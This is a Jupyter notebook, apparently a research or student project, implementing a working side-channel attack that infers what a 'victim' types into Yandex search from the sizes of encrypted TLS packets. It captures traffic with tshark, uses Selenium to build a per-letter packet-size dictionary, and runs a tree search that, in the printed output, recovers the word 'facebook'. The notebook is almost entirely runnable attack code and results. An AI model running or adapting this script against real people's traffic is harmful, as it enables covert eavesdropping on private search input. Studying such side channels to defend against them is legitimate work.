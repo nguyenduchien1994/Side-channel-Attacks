{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [],
   "source": [
    "from bs4 import BeautifulSoup\n",
    "from struct import *\n",
    "import urllib.request\n",
    "import warnings\n",
    "warnings.filterwarnings('ignore')\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import os\n",
    "import sys\n",
    "import time\n",
    "import threading\n",
    "import re\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from subprocess import STDOUT, PIPE, Popen, check_output, check_call, call\n",
    "import socket\n",
    "import netifaces as ni\n",
    "import string\n",
    "\n",
    "# get local ip address\n",
    "ni.ifaddresses('en0')\n",
    "myip = ni.ifaddresses('en0')[2][0]['addr']\n",
    "\n",
    "# get keyword dictionary \n",
    "K=list()\n",
    "with open('keywords.txt','r') as f:\n",
    "    for line in f:\n",
    "        if len(line)>3:\n",
    "            K.append(line[:-1])\n",
    "\n",
    "def terminal(cmd):\n",
    "    os.system(cmd)\n",
    "\n",
    "def tshark(duration,filename):\n",
    "    cmd=\"\"\"tshark -Y \"((ip.dst_host == \"\"\"+myip+\"\"\" && ip.src_host ==213.180.204.62  )|| (ip.dst_host == 213.180.204.62&& ip.src_host == \"\"\"+myip+\"\"\"  ) )&&tcp.port == 443 && ssl.record.version == 0x0303\" -T fields -e frame.time -e ip.src -e ip.dst -e frame.len -e _ws.col.Info -a duration:\"\"\"+str(duration)+\"\"\" > \"\"\" + filename\n",
    "    t=threading.Thread(target=terminal,args=([cmd]))\n",
    "    t.start()\n",
    "    return t\n",
    "\n",
    "def enterALetter(letter,inputElement):\n",
    "    ts2=tshark(3,'dump1.csv')\n",
    "    time.sleep(1)\n",
    "    inputElement.send_keys(letter)\n",
    "    ts2.join()\n",
    "    T2=readDump('dump1.csv')\n",
    "    T2len=list(T2['Length'])\n",
    "    return T2len\n",
    "\n",
    "\n",
    "def enterAWord(wrd,inputElement):\n",
    "    for c in wrd:\n",
    "        inputElement.send_keys(c)\n",
    "        time.sleep(0.2)\n",
    "\n",
    "def enterAllAlphabet(inputElement):\n",
    "   \n",
    "    ts2=tshark(10,'dump1.csv')  #20\n",
    "    time.sleep(3)\n",
    "    alphabet=list(string.ascii_lowercase)+[' ']\n",
    "    for c in alphabet:\n",
    "        inputElement.send_keys(c)\n",
    "        bs=Keys.BACKSPACE\n",
    "        time.sleep(0.1) #0.2\n",
    "        inputElement.send_keys(bs)\n",
    "        time.sleep(0.1) #0.2\n",
    "    ts2.join()\n",
    "    T2=readDump('dump1.csv')\n",
    "    T2len=list(T2['Length'])\n",
    "    return T2len\n",
    "\n",
    "def clearSearch(inputElement):\n",
    "    inputElement.clear()\n",
    "    \n",
    "def readDump(file):\n",
    "    T=pd.read_csv(file,delimiter='\\t',names=['Time','Source','Destination','Length','Info'])\n",
    "    #select=np.logical_or(T['Info']=='Application Data', T['Info']=='Application Data, Application Data')\n",
    "    select=np.logical_and(T['Source']==\"213.180.204.62\",T['Info']=='Application Data, Application Data')\n",
    "    #select=np.logical_and(select,T['Length']>1000)\n",
    "    return T.loc[select]\n",
    "\n",
    "\n",
    "def deleteContent(fName):\n",
    "    with open(fName, \"w\"):\n",
    "        pass\n",
    "    \n",
    "def findMatches(aList,packSize):\n",
    "    returnList=list()\n",
    "    if (len(aList) < 27):\n",
    "        raise ValueError('Your list size (' + str(len(aList)) + ')' + 'less than 27, func:findMatches')\n",
    "    elif (len(aList) > 27):\n",
    "       \n",
    "         raise ValueError('Your list size (' + str(len(aList)) + ')' + 'greater than 27, func:findMatches')\n",
    "        \n",
    "    for i in range(0,len(aList)):\n",
    "        #print(aList[i])\n",
    "        if((packSize >= (aList[i]-2) and (packSize <= (aList[i]+3)))):\n",
    "            returnList.append(i)\n",
    "    return returnList\n",
    "\n",
    "def openYandex():\n",
    "    driver=webdriver.Chrome()\n",
    "    driver.get(\"https://yandex.com\")\n",
    "    time.sleep(2)\n",
    "    inputElement = driver.find_element_by_id(\"text\")\n",
    "    time.sleep(1)\n",
    "    driver_inputelement=list()\n",
    "    driver_inputelement.append(driver)\n",
    "    driver_inputelement.append(inputElement)\n",
    "    return driver_inputelement\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "source": [
    "#### Start TSHARK to Catch the Data Packets of Victim  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Victim input detection is ON\n",
      "[1171, 1205, 1194, 1177]\n"
     ]
    }
   ],
   "source": [
    "\n",
    "deleteContent('dump0.csv')\n",
    "deleteContent('dump1.csv')\n",
    "duration=20  # assume 10 sec enough to catch userinput \n",
    "ts=tshark(duration,'dump0.csv')  # start tshark for 'duration' sec\n",
    "time.sleep(3)\n",
    "#enterAWord(\"facebook\") # ENTER A WORD\n",
    "print(\"Victim input detection is ON\")\n",
    "call(['echo', 'Victim input detection is ON!!!'])\n",
    "ts.join()\n",
    "#while (ts.isAlive()):\n",
    "T=readDump('dump0.csv')\n",
    "print(list(T['Length']))\n",
    "deleteContent('dump0.csv')\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "source": [
    "### Open browser where packet size('A') == 1179\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[1179]\n",
      "Browser Ready!!!\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# PACKAGE SIZES VARY ~2,3 BYTES\n",
    "# 1177, ... , 1182 -> 1182 AND 1177 REALLY RARE CASES,\n",
    "# OVERALL 1179-2 TO 1179 + 3 \n",
    "# LUCKILY IF ONE LETTER CHANGES 1 BYTE, ALL OF THE OTHER LETTERS CHANGE 1 BYTE\n",
    "\n",
    "# OPEN GOOGLE CHROME UP UNTIL A==1179\n",
    "driver_inputelement = []\n",
    "sizeA = [0]\n",
    "while(1):\n",
    "    driver_inputelement = openYandex()\n",
    "    inputElement = driver_inputelement[1]\n",
    "    sizeA=enterALetter('a', inputElement )\n",
    "    driver=driver_inputelement[0]\n",
    "    print(sizeA)\n",
    "    if(sizeA[0]  != 1179):\n",
    "        driver.close()\n",
    "    else:\n",
    "        break  \n",
    "    \n",
    "\n",
    "clearSearch(inputElement)\n",
    "print(\"Browser Ready!!!\")\n",
    "call(['echo', 'Browser Ready!!!'])\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "deletable": true,
    "editable": true
   },
   "source": [
    "### Start Deciphering Process\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true,
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Letter Package Sizes [1271, 1227, 1177, 1233, 1177, 1288, 1177, 1263, 1177, 1271, 1177, 1233, 1177, 1311, 1177, 1260, 1177, 1121, 1177, 1309, 1177, 1301, 1177, 1283, 1177, 997, 1177, 1270, 1177, 1227, 1177]\n"
     ]
    },
    {
     "ename": "ValueError",
     "evalue": "Your list size (31)greater than 27, func:findMatches",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mValueError\u001b[0m                                Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-6-48454f388bb3>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m     26\u001b[0m         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mletterPackSizes\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     27\u001b[0m         \u001b[0;31m#insert matches to the tree\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 28\u001b[0;31m         \u001b[0mindices\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mfindMatches\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mletterPackSizes\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0muserInput\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     29\u001b[0m         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'First letter options: '\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mend\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0;34m''\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     30\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m<ipython-input-1-dce426ccb94a>\u001b[0m in \u001b[0;36mfindMatches\u001b[0;34m(aList, packSize)\u001b[0m\n\u001b[1;32m     90\u001b[0m     \u001b[0;32melif\u001b[0m \u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0maList\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m>\u001b[0m \u001b[0;36m27\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     91\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 92\u001b[0;31m          \u001b[0;32mraise\u001b[0m \u001b[0mValueError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'Your list size ('\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0mstr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0maList\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m')'\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m'greater than 27, func:findMatches'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     93\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     94\u001b[0m     \u001b[0;32mfor\u001b[0m \u001b[0mi\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mrange\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mlen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0maList\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mValueError\u001b[0m: Your list size (31)greater than 27, func:findMatches"
     ]
    }
   ],
   "source": [
    "call(['echo', 'Deciphering Process Starting...'])\n",
    "time.sleep(2)\n",
    "\n",
    "tree=[]\n",
    "topofTree={'char':'null', 'parent':-1, 'degree':0, 'flag':1} #flag shows if node is active or removed\n",
    "# topofTree['parent']\n",
    "tree.append(topofTree)\n",
    "#tree[0]['parent']\n",
    "\n",
    "userInput=list(T['Length'])\n",
    "userInputSize=len(userInput)\n",
    "i = 0\n",
    "alphabet=list(string.ascii_lowercase)+[' ']\n",
    "currentDegree=0\n",
    "\n",
    "while(i < userInputSize):\n",
    "    currentPackSize = userInput[i]\n",
    "    inserted=0 # check if new node inserted or not to increment degree\n",
    "    newNodesOfTree=[] #new Nodes to be inserted into the tree at the end of 26 letter type process\n",
    "    #if first letter, directly type all letters, insert matches\n",
    "    if( i==0 ):\n",
    "        i = i + 1\n",
    "        #inputElement = openYandex() \n",
    "        letterPackSizes = enterAllAlphabet(inputElement) #type 26 letter\n",
    "        print('Letter Package Sizes',end=' ') \n",
    "        print(letterPackSizes)\n",
    "        #insert matches to the tree\n",
    "        indices = findMatches(letterPackSizes,userInput[0])\n",
    "        print('First letter options: ',end='')\n",
    "                 \n",
    "        for x in range(0,len(indices)):\n",
    "            print( alphabet[ indices[x] ],end=' ' )\n",
    "            newNode = {'char':alphabet[indices[x]],'parent':0,'degree':1,'flag':1}\n",
    "            tree.append(newNode)\n",
    "            #print(alphabet[indices[x]])\n",
    "        currentDegree += 1\n",
    "        print('')\n",
    "        continue\n",
    "        \n",
    "    # number of element thats have i degree\n",
    "    rootNum=len([t for t in range(len(tree)) if tree[t]['degree']==currentDegree])\n",
    "\n",
    "    for j in range (rootNum,0,-1):\n",
    "        newNode=tree[len(tree)-j]\n",
    "        #if(newNode['flag']==0) continue # if removed node no need to go on\n",
    "        toBeTypedBefore=[]\n",
    "        currentNode=newNode\n",
    "        print('\\nCurrentNode: ',end=' ')\n",
    "        print(currentNode)\n",
    "        \n",
    "        while( currentNode['parent'] != -1 ):\n",
    "            toBeTypedBefore.append(currentNode['char']) # bottom one inserted\n",
    "            currentNode=tree[currentNode['parent']]\n",
    "        currentNode=newNode\n",
    "        toBeTypedBefore=toBeTypedBefore[::-1]\n",
    "        print(\"toBeTypedBefore:\" + ''.join(toBeTypedBefore))  #type reverse of toBeTypedBefore\n",
    "        \n",
    "        clearSearch(inputElement)  #clear search engine\n",
    "        enterAWord(toBeTypedBefore,inputElement)        #type toBeTyped\n",
    "        letterPackSizes=enterAllAlphabet(inputElement) #type 27 letter after that \n",
    "        \n",
    "        #print(\"letterPackSizes:\")  #type reverse of toBeTypedBefore\n",
    "        #print(letterPackSizes)\n",
    "        letterPackSizesTemp=[]\n",
    "        for k in range (0,len(letterPackSizes),2): #remove repetitive package sizes\n",
    "            letterPackSizesTemp.append(letterPackSizes[k])\n",
    "        letterPackSizes=letterPackSizesTemp\n",
    "            \n",
    "        indices = findMatches(letterPackSizes,userInput[i])\n",
    "        \n",
    "        if(len(indices) == 0):\n",
    "            print('Next letter does not exist')\n",
    "        else:  \n",
    "            print('next letter options:',end='')\n",
    "            for x in range(0,len(indices)):\n",
    "                print( alphabet[indices[x]],end=' ')\n",
    "        print('')\n",
    "        \n",
    "        tempNode=[]\n",
    "        \n",
    "        if(len(indices)==0): #if there is no match kill that path\n",
    "          # while( currentNode['parent'] != -1 ): #remove recursively\n",
    "            tempNode=tree[currentNode['parent']]\n",
    "            print(repr(currentNode) + '-> flag set to 0:')\n",
    "            index=tree.index(currentNode) #find location of currentnode\n",
    "            tree[index]['flag']=0\n",
    "            currentNode=tempNode\n",
    "        else :#else insert matches to that node\n",
    "        \n",
    "            print('Number of added letters: ' + repr(len(indices)))\n",
    "            if(len(indices) == 26):\n",
    "                print('SORRY ADMIN... NO MORE REDUCTION in this path ')\n",
    "                continue\n",
    "            else:  \n",
    "                inserted=1\n",
    "                for x in range(0,len(indices)):\n",
    "                    newNode={'char':alphabet[indices[x]],'parent':tree.index(currentNode),'degree':(currentDegree+1),'flag':1}\n",
    "                    newNodesOfTree.append(newNode)\n",
    "                   # print(\"newNodesOfTree:\")\n",
    "                   # print(newNodesOfTree)\n",
    "    \n",
    "            \n",
    "   \n",
    "    if(inserted):\n",
    "        currentDegree=currentDegree+1\n",
    "    \n",
    "    print('Number of Nodes:' + repr(len(newNodesOfTree)) +'\\n')\n",
    "    tree=tree+newNodesOfTree\n",
    "    \n",
    "    \n",
    "    \n",
    "    i=i+1 \n",
    "print('Process is done!!!')\n",
    "call(['echo', 'Process is done!!!'])\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "deletable": true,
    "editable": true
   },
   "source": [
    "### Print Tree, Show possible inputs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true,
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Path 0\n",
      "{'char': 'l', 'parent': 0, 'degree': 1, 'flag': 0}\n",
      "\n",
      "Path 1\n",
      "{'char': 'f', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "{'char': 'c', 'parent': 3, 'degree': 3, 'flag': 1}\n",
      "{'char': 'v', 'parent': 4, 'degree': 4, 'flag': 0}\n",
      "\n",
      "Path 2\n",
      "{'char': 'f', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "{'char': 'c', 'parent': 3, 'degree': 3, 'flag': 1}\n",
      "{'char': 'e', 'parent': 4, 'degree': 4, 'flag': 1}\n",
      "{'char': 'b', 'parent': 5, 'degree': 5, 'flag': 1}\n",
      "{'char': 'e', 'parent': 7, 'degree': 6, 'flag': 0}\n",
      "\n",
      "Path 3\n",
      "{'char': 'f', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "{'char': 'c', 'parent': 3, 'degree': 3, 'flag': 1}\n",
      "{'char': 'e', 'parent': 4, 'degree': 4, 'flag': 1}\n",
      "{'char': 'b', 'parent': 5, 'degree': 5, 'flag': 1}\n",
      "{'char': 'h', 'parent': 7, 'degree': 6, 'flag': 0}\n",
      "\n",
      "Path 4\n",
      "{'char': 'f', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "{'char': 'c', 'parent': 3, 'degree': 3, 'flag': 1}\n",
      "{'char': 'e', 'parent': 4, 'degree': 4, 'flag': 1}\n",
      "{'char': 's', 'parent': 5, 'degree': 5, 'flag': 1}\n",
      "{'char': 'k', 'parent': 8, 'degree': 6, 'flag': 0}\n",
      "\n",
      "Deciphering...\n",
      "Victim typed...\n",
      "\n",
      "Path 0\n",
      "{'char': 'f', 'parent': 0, 'degree': 1, 'flag': 1}\n",
      "{'char': 'a', 'parent': 1, 'degree': 2, 'flag': 1}\n",
      "{'char': 'c', 'parent': 3, 'degree': 3, 'flag': 1}\n",
      "{'char': 'e', 'parent': 4, 'degree': 4, 'flag': 1}\n",
      "{'char': 'b', 'parent': 5, 'degree': 5, 'flag': 1}\n",
      "{'char': 'o', 'parent': 7, 'degree': 6, 'flag': 1}\n",
      "{'char': 'o', 'parent': 11, 'degree': 7, 'flag': 1}\n",
      "{'char': 'k', 'parent': 13, 'degree': 8, 'flag': 1}\n"
     ]
    }
   ],
   "source": [
    "\n",
    "ix=[t for t in range(len(tree)) if tree[t]['flag']==0]\n",
    "#print(ix)\n",
    "   \n",
    "for t in range(len(ix)):\n",
    "    print('\\nPath ' + repr(t))\n",
    "    toBePrinted=[]\n",
    "    node=(tree[ix[t]])\n",
    "    while(node['parent'] != -1):\n",
    "        #print(node)\n",
    "        toBePrinted.append(node)\n",
    "        node=tree[node['parent']]\n",
    "    for k in range (len(toBePrinted),0,-1):\n",
    "        print(toBePrinted[k-1])\n",
    "#Final Paths\n",
    "\n",
    "print('\\nDeciphering...')\n",
    "print('Victim typed...')\n",
    "\n",
    "ix=[t for t in range(len(tree)) if tree[t]['degree']==(currentDegree)]\n",
    "\n",
    "# find nodes which satisfy nodes.degree == currentdegree \n",
    "for t in range(len(ix)):\n",
    "    print('\\nPath ' + repr(t))\n",
    "    toBePrinted=[]\n",
    "    node=(tree[ix[t]])\n",
    "    while(node['parent'] != -1):\n",
    "        toBePrinted.append(node)\n",
    "        node=tree[node['parent']]\n",
    "    for k in range (len(toBePrinted),0,-1):\n",
    "        print(toBePrinted[k-1])\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "collapsed": false,
    "deletable": true,
    "editable": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[['a', 0, 0], ['e', 1, 0]]"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a=[]\n",
    "a.append(['a',0,0])\n",
    "a.append(['e',1,0])\n",
    "a"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
